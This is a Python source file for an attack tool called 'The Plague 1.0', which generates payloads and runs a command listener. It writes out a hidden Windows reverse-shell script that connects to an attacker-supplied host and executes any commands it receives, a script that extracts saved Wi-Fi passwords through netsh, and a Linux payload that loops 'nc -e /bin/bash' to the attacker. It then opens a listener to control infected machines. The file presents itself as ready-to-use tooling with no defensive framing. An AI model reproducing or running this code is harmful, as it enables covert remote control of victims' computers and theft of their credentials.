import sys
import os
import time
from socket import *
import platform
banner = """                                                                          
    @@@@@@@  @@@  @@@  @@@@@@@@     @@@@@@@   @@@        @@@@@@    @@@@@@@@  @@@  @@@  @@@@@@@@  
    @@@@@@@  @@@  @@@  @@@@@@@@     @@@@@@@@  @@@       @@@@@@@@  @@@@@@@@@  @@@  @@@  @@@@@@@@  
      @@!    @@!  @@@  @@!          @@!  @@@  @@!       @@!  @@@  !@@        @@!  @@@  @@!       
      !@!    !@!  @!@  !@!          !@!  @!@  !@!       !@!  @!@  !@!        !@!  @!@  !@!       
      @!!    @!@!@!@!  @!!!:!       @!@@!@!   @!!       @!@!@!@!  !@! @!@!@  @!@  !@!  @!!!:!    
      !!!    !!!@!!!!  !!!!!:       !!@!!!    !!!       !!!@!!!!  !!! !!@!!  !@!  !!!  !!!!!:    
      !!:    !!:  !!!  !!:          !!:       !!:       !!:  !!!  :!!   !!:  !!:  !!!  !!:       
      :!:    :!:  !:!  :!:          :!:        :!:      :!:  !:!  :!:   !::  :!:  !:!  :!:       
       ::    ::   :::   :: ::::      ::        :: ::::  ::   :::   ::: ::::  ::::: ::   :: ::::  
       :      :   : :  : :: ::       :        : :: : :   :   : :   :: :: :    : :  :   : :: ::   
        The Plague 1.0
        Coded by Omar Ahmed
        Date of relese: March 4th 2023 """
def clear_scr():
    if platform.platform()[0:3] == "Lin":
        os.system("clear")
    elif platform.platform()[0:3] == "Win":
        os.system("cls")
    else:
        return
def error_out():
    print("invalid argument")
    print("python3 nclient.py [Option] [argument1] [argument2]")
    print("")
    print("Options:")
    print("")
    print("1                                    windows")
    print("")
    print("2                                    linux")
    exit()

try:
    if sys.argv[1] == "1":
        try:
            if sys.argv[2] == "1":
                try:
                    LHOST = sys.argv[3]
                    LPORT = sys.argv[4]
                except IndexError:
                    print("invalid argument")
                    print("try: python3 nclient.py 1 1 LHOST LPORT")
                    exit()
                    
                
            
                def socket_server():
                    try:
                        ip = f"{LHOST}"
                        port = int(LPORT)
                        clear_scr()
                        print(banner)
                        print("")
                        print(f"    Listening on port {LPORT} and ip add {LHOST}")
                        print("")
                        connection = socket(AF_INET, SOCK_STREAM)
                        connection.bind((ip, port))
                        
                        connection.listen(5)
                        client, addr = connection.accept()
                        
                        print("connect -> "+str(addr))
                        print("")
                        print("type exit to quit")
                        print("")
                        print("type cls to clear screen")
                        print("")
                    except KeyboardInterrupt:
                        print("Are youto lazy to type exit!?")
                        exit()


                    

                    def main_func():
                        try:
                            while True:
                                recever = client.recv(2000).decode()
                                print(recever)
                                cmd = input("The-Plague>")                         
                                if cmd == "exit" :
                                    client.send(cmd.encode())
                                    exit()
                                elif cmd == "" or cmd == None:
                                    try:
                                        cmd = ("?")
                                    except:
                                        pass
                                    client.send(cmd.encode())
                                elif cmd == "cls":
                                    
                                    try:
                                        clear_scr()
                                        print(banner)
                                        
                                    except:
                                        pass
                                    client.send(cmd.encode())                                    
                                else:
                                    client.send(cmd.encode())
                        except KeyboardInterrupt:
                            print("")
                            print("Are you to lazy to type exit!?")
                            exit()

                    main_func()
                f = open("windows_r_shell.pyw", "w")
                f.write(f'''from getpass import getuser
from socket import * 
import subprocess
import platform
import os 
import time

get_os = platform.uname()
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)

ip = "{LHOST}"

port = {LPORT}
connection = socket(AF_INET, SOCK_STREAM)
def final_func():
    def conn_func():
        connection.connect((ip, port))
        connection.send(os_info.encode())
        while True:
            recever = connection.recv(2000).decode()

            if recever == "exit":
                exit()
            elif recever[:2] == "cd":
                try:
                    os.chdir(recever[3:])
                except:
                    pass
                connection.send(os.getcwd().encode())   
            elif recever == "":
                os.chdir(recever[3:])
                connection.send(os.getcwd().encode())

            else:
                out_put = subprocess.getoutput(recever)

                if out_put == "" or out_put == None:
                    out_put = ""
                    connection.send(out_put.encode())
                else:
                    connection.send(out_put.encode())
    try:
        conn_func()
    except:
        pass
while True:
    time.sleep(2)
    final_func()
''')
                f.close()
                listener = input("do you want to start a listener y/n: ")
                if listener == "y" or listener == "Y":
                    print("Listening...")
                    socket_server()
                else:
                    exit()

                 
        
            if sys.argv[2] == "2":

                try:
                    wifi_name = sys.argv[3]
                except IndexError:
                    print("invalid argument")
                    print('try: python3 nclient.py 1 2 Wifi_name')
                    exit()
                f = open("payload.py", "w")
                f.write(f'''import os
import platform
if platform.platform()[0:3] == "Win":
    command = os.popen('netsh wlan show profile name="{wifi_name}" key=clear')
    cmd_out = command.read()
    f = open("wifi-pass.txt", "a")
    f.write(cmd_out)
    f.write("========================================================================")
else:
    exit()''')
                f.close()
                clear_scr()
                print(banner)
        except IndexError:
            print("invalid argument")
            print("try:  python3 nclient.py 1 [argument]")
            print("")
            print("1                          windows reverse shell ")
            print("")
            print("2                          windows extract wifi passwords")
            exit()


    elif sys.argv[1] == "2":
        try:
            LHOST = sys.argv[2]
            LPORT = sys.argv[3]
        except IndexError:
            print("invalid argument")
            print('try: python3 nclient.py 2 LHOST LPORT')
            exit()
        try:
            int(LPORT)
        except ValueError:
            print("invalid LHOST")
            exit()
        if len(LHOST) > 15:
            print("invalid LHOST")
            exit()
        elif len(LHOST) < 9:
            print("invalid LHOST")
            exit()
        f = open("r-shell.py", "w")
        f.write(f'''import os
import time
import platform
try:
    if platform.platform()[0:3] == "Lin":
        while(True):
            os.system("nc -e /bin/bash {LHOST} {LPORT}")
            time.sleep(10)
except:
    print()''')
        f.close()
        clear_scr()
        print(banner)
        os.system(f"nc -lnvp {LPORT} -s {LHOST}")
       
            
    else:
        error_out()
        


except IndexError:
    error_out()
    



